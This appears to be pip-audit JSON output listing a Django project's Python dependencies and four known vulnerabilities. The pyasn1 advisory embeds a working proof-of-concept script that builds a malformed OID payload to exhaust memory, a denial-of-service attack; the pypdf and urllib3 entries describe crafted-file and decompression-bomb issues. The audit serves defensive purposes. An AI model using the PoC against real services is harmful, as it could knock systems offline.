Found 4 known vulnerabilities in 3 packages
{"dependencies": [{"name": "annotated-types", "version": "0.7.0", "vulns": []}, {"name": "anyio", "version": "4.12.1", "vulns": []}, {"name": "asgiref", "version": "3.11.0", "vulns": []}, {"name": "authlib", "version": "1.6.6", "vulns": []}, {"name": "backend", "skip_reason": "Dependency not found on PyPI and could not be audited: backend (0.1.0)"}, {"name": "bandit", "version": "1.9.3", "vulns": []}, {"name": "black", "version": "24.10.0", "vulns": []}, {"name": "boolean-py", "version": "5.0", "vulns": []}, {"name": "cachecontrol", "version": "0.14.4", "vulns": []}, {"name": "cachetools", "version": "6.2.4", "vulns": []}, {"name": "certifi", "version": "2025.11.12", "vulns": []}, {"name": "cffi", "version": "2.0.0", "vulns": []}, {"name": "charset-normalizer", "version": "3.4.4", "vulns": []}, {"name": "click", "version": "8.3.1", "vulns": []}, {"name": "coverage", "version": "7.13.0", "vulns": []}, {"name": "cryptography", "version": "46.0.3", "vulns": []}, {"name": "cyclonedx-python-lib", "version": "11.6.0", "vulns": []}, {"name": "defusedxml", "version": "0.7.1", "vulns": []}, {"name": "django", "version": "6.0", "vulns": []}, {"name": "django-anymail", "version": "14.0", "vulns": []}, {"name": "django-cors-headers", "version": "4.9.0", "vulns": []}, {"name": "django-filter", "version": "25.2", "vulns": []}, {"name": "django-storages", "version": "1.14.6", "vulns": []}, {"name": "django-stubs", "version": "4.2.7", "vulns": []}, {"name": "django-stubs-ext", "version": "5.2.8", "vulns": []}, {"name": "djangorestframework", "version": "3.16.1", "vulns": []}, {"name": "djangorestframework-simplejwt", "version": "5.5.1", "vulns": []}, {"name": "dparse", "version": "0.6.4", "vulns": []}, {"name": "drf-nested-routers", "version": "0.95.0", "vulns": []}, {"name": "drf-yasg", "version": "1.21.11", "vulns": []}, {"name": "factory-boy", "version": "3.3.3", "vulns": []}, {"name": "faker", "version": "22.7.0", "vulns": []}, {"name": "filelock", "version": "3.20.3", "vulns": []}, {"name": "google-api-core", "version": "2.28.1", "vulns": []}, {"name": "google-auth", "version": "2.45.0", "vulns": []}, {"name": "google-cloud-core", "version": "2.5.0", "vulns": []}, {"name": "google-cloud-storage", "version": "2.19.0", "vulns": []}, {"name": "google-cloud-tasks", "version": "2.20.0", "vulns": []}, {"name": "google-crc32c", "version": "1.8.0", "vulns": []}, {"name": "google-resumable-media", "version": "2.8.0", "vulns": []}, {"name": "googleapis-common-protos", "version": "1.72.0", "vulns": []}, {"name": "grpc-google-iam-v1", "version": "0.14.3", "vulns": []}, {"name": "grpcio", "version": "1.76.0", "vulns": []}, {"name": "grpcio-status", "version": "1.76.0", "vulns": []}, {"name": "gunicorn", "version": "22.0.0", "vulns": []}, {"name": "h11", "version": "0.16.0", "vulns": []}, {"name": "httpcore", "version": "1.0.9", "vulns": []}, {"name": "httpx", "version": "0.28.1", "vulns": []}, {"name": "idna", "version": "3.11", "vulns": []}, {"name": "inflection", "version": "0.5.1", "vulns": []}, {"name": "iniconfig", "version": "2.3.0", "vulns": []}, {"name": "jinja2", "version": "3.1.6", "vulns": []}, {"name": "joblib", "version": "1.5.3", "vulns": []}, {"name": "librt", "version": "0.7.4", "vulns": []}, {"name": "license-expression", "version": "30.4.4", "vulns": []}, {"name": "markdown-it-py", "version": "4.0.0", "vulns": []}, {"name": "markupsafe", "version": "3.0.3", "vulns": []}, {"name": "marshmallow", "version": "4.2.0", "vulns": []}, {"name": "mdurl", "version": "0.1.2", "vulns": []}, {"name": "msgpack", "version": "1.1.2", "vulns": []}, {"name": "mypy", "version": "1.19.1", "vulns": []}, {"name": "mypy-extensions", "version": "1.1.0", "vulns": []}, {"name": "nltk", "version": "3.9.2", "vulns": []}, {"name": "packageurl-python", "version": "0.17.6", "vulns": []}, {"name": "packaging", "version": "25.0", "vulns": []}, {"name": "pathspec", "version": "0.12.1", "vulns": []}, {"name": "pdf2image", "version": "1.17.0", "vulns": []}, {"name": "pillow", "version": "10.4.0", "vulns": []}, {"name": "pip", "version": "25.3", "vulns": []}, {"name": "pip-api", "version": "0.0.34", "vulns": []}, {"name": "pip-audit", "version": "2.10.0", "vulns": []}, {"name": "pip-requirements-parser", "version": "32.0.1", "vulns": []}, {"name": "platformdirs", "version": "4.5.1", "vulns": []}, {"name": "pluggy", "version": "1.6.0", "vulns": []}, {"name": "proto-plus", "version": "1.27.0", "vulns": []}, {"name": "protobuf", "version": "6.33.2", "vulns": []}, {"name": "psycopg", "version": "3.3.2", "vulns": []}, {"name": "psycopg-binary", "version": "3.3.2", "vulns": []}, {"name": "py-serializable", "version": "2.1.0", "vulns": []}, {"name": "pyasn1", "version": "0.6.1", "vulns": [{"id": "CVE-2026-23490", "fix_versions": ["0.6.2"], "aliases": ["GHSA-63vm-454h-vhhq"], "description": "### Summary  After reviewing pyasn1 v0.6.1 a Denial-of-Service issue has been found that leads to memory exhaustion from malformed RELATIVE-OID with excessive continuation octets.  ### Details  The integer issue can be found in the decoder as `reloid += ((subId << 7) + nextSubId,)`: https://github.com/pyasn1/pyasn1/blob/main/pyasn1/codec/ber/decoder.py#L496  ### PoC  For the DoS: ```py import pyasn1.codec.ber.decoder as decoder import pyasn1.type.univ as univ import sys import resource  # Deliberately set memory limit to display PoC try:     resource.setrlimit(resource.RLIMIT_AS, (100*1024*1024, 100*1024*1024))     print(\"[*] Memory limit set to 100MB\") except:     print(\"[-] Could not set memory limit\")  # Test with different payload sizes to find the DoS threshold payload_size_mb = int(sys.argv[1])  print(f\"[*] Testing with {payload_size_mb}MB payload...\")  payload_size = payload_size_mb * 1024 * 1024 # Create payload with continuation octets # Each 0x81 byte indicates continuation, causing bit shifting in decoder payload = b'\\x81' * payload_size + b'\\x00' length = len(payload)  # DER length encoding (supports up to 4GB) if length < 128:     length_bytes = bytes([length]) elif length < 256:     length_bytes = b'\\x81' + length.to_bytes(1, 'big') elif length < 256**2:     length_bytes = b'\\x82' + length.to_bytes(2, 'big') elif length < 256**3:     length_bytes = b'\\x83' + length.to_bytes(3, 'big') else:     # 4 bytes can handle up to 4GB     length_bytes = b'\\x84' + length.to_bytes(4, 'big')  # Use OID (0x06) for more aggressive parsing malicious_packet = b'\\x06' + length_bytes + payload  print(f\"[*] Packet size: {len(malicious_packet) / 1024 / 1024:.1f} MB\")  try:     print(\"[*] Decoding (this may take time or exhaust memory)...\")     result = decoder.decode(malicious_packet, asn1Spec=univ.ObjectIdentifier())      print(f'[+] Decoded successfully')     print(f'[!] Object size: {sys.getsizeof(result[0])} bytes')      # Try to convert to string     print('[*] Converting to string...')     try:         str_result = str(result[0])         print(f'[+] String succeeded: {len(str_result)} chars')         if len(str_result) > 10000:             print(f'[!] MEMORY EXPLOSION: {len(str_result)} character string!')     except MemoryError:         print(f'[-] MemoryError during string conversion!')     except Exception as e:         print(f'[-] {type(e).__name__} during string conversion')  except MemoryError:     print('[-] MemoryError: Out of memory!') except Exception as e:     print(f'[-] Error: {type(e).__name__}: {e}')   print(\"\\n[*] Test completed\") ```   Screenshots with the results:  #### DoS <img width=\"944\" height=\"207\" alt=\"Screenshot_20251219_160840\" src=\"https://github.com/user-attachments/assets/68b9566b-5ee1-47b0-a269-605b037dfc4f\" />  <img width=\"931\" height=\"231\" alt=\"Screenshot_20251219_152815\" src=\"https://github.com/user-attachments/assets/62eacf4f-eb31-4fba-b7a8-e8151484a9fa\" />  #### Leak analysis  A potential heap leak was investigated but came back clean: ``` [*] Creating 1000KB payload... [*] Decoding with pyasn1... [*] Materializing to string... [+] Decoded 2157784 characters [+] Binary representation: 896001 bytes [+] Dumped to heap_dump.bin  [*] First 64 bytes (hex):   01020408102040810204081020408102040810204081020408102040810204081020408102040810204081020408102040810204081020408102040810204081  [*] First 64 bytes (ASCII/hex dump):   0000: 01 02 04 08 10 20 40 81 02 04 08 10 20 40 81 02  ..... @..... @..   0010: 04 08 10 20 40 81 02 04 08 10 20 40 81 02 04 08  ... @..... @....   0020: 10 20 40 81 02 04 08 10 20 40 81 02 04 08 10 20  . @..... @.....    0030: 40 81 02 04 08 10 20 40 81 02 04 08 10 20 40 81  @..... @..... @.  [*] Digit distribution analysis:   '0':  10.1%   '1':   9.9%   '2':  10.0%   '3':   9.9%   '4':   9.9%   '5':  10.0%   '6':  10.0%   '7':  10.0%   '8':   9.9%   '9':  10.1% ```  ### Scenario  1. An attacker creates a malicious X.509 certificate. 2. The application validates certificates. 3. The application accepts the malicious certificate and tries decoding resulting in the issues mentioned above.  ### Impact  This issue can affect resource consumption and hang systems or stop services. This may affect: - LDAP servers - TLS/SSL endpoints - OCSP responders - etc.  ### Recommendation  Add a limit to the allowed bytes in the decoder."}]}, {"name": "pyasn1-modules", "version": "0.4.2", "vulns": []}, {"name": "pycparser", "version": "2.23", "vulns": []}, {"name": "pydantic", "version": "2.12.5", "vulns": []}, {"name": "pydantic-core", "version": "2.41.5", "vulns": []}, {"name": "pygments", "version": "2.19.2", "vulns": []}, {"name": "pyjwt", "version": "2.10.1", "vulns": []}, {"name": "pyparsing", "version": "3.3.1", "vulns": []}, {"name": "pypdf", "version": "6.5.0", "vulns": [{"id": "CVE-2026-22690", "fix_versions": ["6.6.0"], "aliases": ["GHSA-4xc4-762w-m6cg"], "description": "### Impact An attacker who exploits this vulnerability can craft a PDF which leads to possibly long runtimes for actually invalid files. This can be achieved by omitting the `/Root` entry in the trailer, while using a rather large `/Size` value. Only the non-strict reading mode is affected.  ### Patches This has been fixed in [pypdf==6.6.0](https://github.com/py-pdf/pypdf/releases/tag/6.6.0).  ### Workarounds  ```python from pypdf import PdfReader, PdfWriter   # Instead of reader = PdfReader(\"file.pdf\") # use the strict mode: reader = PdfReader(\"file.pdf\", strict=True)  # Instead of writer = PdfWriter(clone_from=\"file.pdf\") # use an explicit strict reader: writer = PdfWriter(clone_from=PdfReader(\"file.pdf\", strict=True)) ```  ### Resources This issue has been fixed in #3594."}, {"id": "CVE-2026-22691", "fix_versions": ["6.6.0"], "aliases": ["GHSA-4f6g-68pf-7vhv"], "description": "### Impact An attacker who exploits this vulnerability can craft a PDF which leads to possibly long runtimes for invalid `startxref` entries. When rebuilding the cross-reference table, PDF files with lots of whitespace characters become problematic. Only the non-strict reading mode is affected.  ### Patches This has been fixed in [pypdf==6.6.0](https://github.com/py-pdf/pypdf/releases/tag/6.6.0).  ### Workarounds  ```python from pypdf import PdfReader, PdfWriter   # Instead of reader = PdfReader(\"file.pdf\") # use the strict mode: reader = PdfReader(\"file.pdf\", strict=True)  # Instead of writer = PdfWriter(clone_from=\"file.pdf\") # use an explicit strict reader: writer = PdfWriter(clone_from=PdfReader(\"file.pdf\", strict=True)) ```  ### Resources This issue has been fixed in #3594."}]}, {"name": "pytest", "version": "8.4.2", "vulns": []}, {"name": "pytest-cov", "version": "4.1.0", "vulns": []}, {"name": "pytest-django", "version": "4.11.1", "vulns": []}, {"name": "python-dateutil", "version": "2.9.0.post0", "vulns": []}, {"name": "python-dotenv", "version": "1.2.1", "vulns": []}, {"name": "python-json-logger", "version": "4.0.0", "vulns": []}, {"name": "pytz", "version": "2025.2", "vulns": []}, {"name": "pyyaml", "version": "6.0.3", "vulns": []}, {"name": "qrcode", "version": "8.2", "vulns": []}, {"name": "redis", "version": "5.3.1", "vulns": []}, {"name": "regex", "version": "2026.1.15", "vulns": []}, {"name": "reportlab", "version": "4.4.6", "vulns": []}, {"name": "requests", "version": "2.32.5", "vulns": []}, {"name": "rich", "version": "14.2.0", "vulns": []}, {"name": "rsa", "version": "4.9.1", "vulns": []}, {"name": "ruamel-yaml", "version": "0.19.1", "vulns": []}, {"name": "ruff", "version": "0.14.9", "vulns": []}, {"name": "safety", "version": "3.7.0", "vulns": []}, {"name": "safety-schemas", "version": "0.0.16", "vulns": []}, {"name": "sentry-sdk", "version": "2.49.0", "vulns": []}, {"name": "shellingham", "version": "1.5.4", "vulns": []}, {"name": "six", "version": "1.17.0", "vulns": []}, {"name": "sortedcontainers", "version": "2.4.0", "vulns": []}, {"name": "sqlparse", "version": "0.5.4", "vulns": []}, {"name": "stevedore", "version": "5.6.0", "vulns": []}, {"name": "stripe", "version": "8.11.0", "vulns": []}, {"name": "tenacity", "version": "9.1.2", "vulns": []}, {"name": "tomli", "version": "2.4.0", "vulns": []}, {"name": "tomli-w", "version": "1.2.0", "vulns": []}, {"name": "tomlkit", "version": "0.14.0", "vulns": []}, {"name": "tqdm", "version": "4.67.1", "vulns": []}, {"name": "typer", "version": "0.21.1", "vulns": []}, {"name": "types-pytz", "version": "2025.2.0.20251108", "vulns": []}, {"name": "types-pyyaml", "version": "6.0.12.20250915", "vulns": []}, {"name": "typing-extensions", "version": "4.15.0", "vulns": []}, {"name": "typing-inspection", "version": "0.4.2", "vulns": []}, {"name": "uritemplate", "version": "4.2.0", "vulns": []}, {"name": "urllib3", "version": "2.6.2", "vulns": [{"id": "CVE-2026-21441", "fix_versions": ["2.6.3"], "aliases": ["GHSA-38jv-5279-wg99"], "description": "### Impact  urllib3's [streaming API](https://urllib3.readthedocs.io/en/2.6.2/advanced-usage.html#streaming-and-i-o) is designed for the efficient handling of large HTTP responses by reading the content in chunks, rather than loading the entire response body into memory at once.  urllib3 can perform decoding or decompression based on the HTTP `Content-Encoding` header (e.g., `gzip`, `deflate`, `br`, or `zstd`). When using the streaming API, the library decompresses only the necessary bytes, enabling partial content consumption.  However, for HTTP redirect responses, the library would read the entire response body to drain the connection and decompress the content unnecessarily. This decompression occurred even before any read methods were called, and configured read limits did not restrict the amount of decompressed data. As a result, there was no safeguard against decompression bombs. A malicious server could exploit this to trigger excessive resource consumption on the client (high CPU usage and large memory allocations for decompressed data; CWE-409).  ### Affected usages  Applications and libraries using urllib3 version 2.6.2 and earlier to stream content from untrusted sources by setting `preload_content=False` when they do not disable redirects.   ### Remediation  Upgrade to at least urllib3 v2.6.3 in which the library does not decode content of redirect responses when `preload_content=False`.  If upgrading is not immediately possible, disable [redirects](https://urllib3.readthedocs.io/en/2.6.2/user-guide.html#retrying-requests) by setting `redirect=False` for requests to untrusted source."}]}, {"name": "whitenoise", "version": "6.11.0", "vulns": []}], "fixes": []}
